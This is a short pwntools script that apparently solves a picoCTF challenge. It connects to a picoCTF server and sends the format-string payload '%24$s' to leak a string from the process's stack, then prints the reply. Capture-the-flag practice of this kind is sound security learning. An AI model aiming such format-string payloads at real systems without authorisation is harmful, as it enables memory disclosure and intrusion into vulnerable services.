from pwn import *

p = remote("saturn.picoctf.net", 56175)



payload = b"%24$s"
p.sendline(payload)



s = p.recvall().decode('latin-1')
print(s)
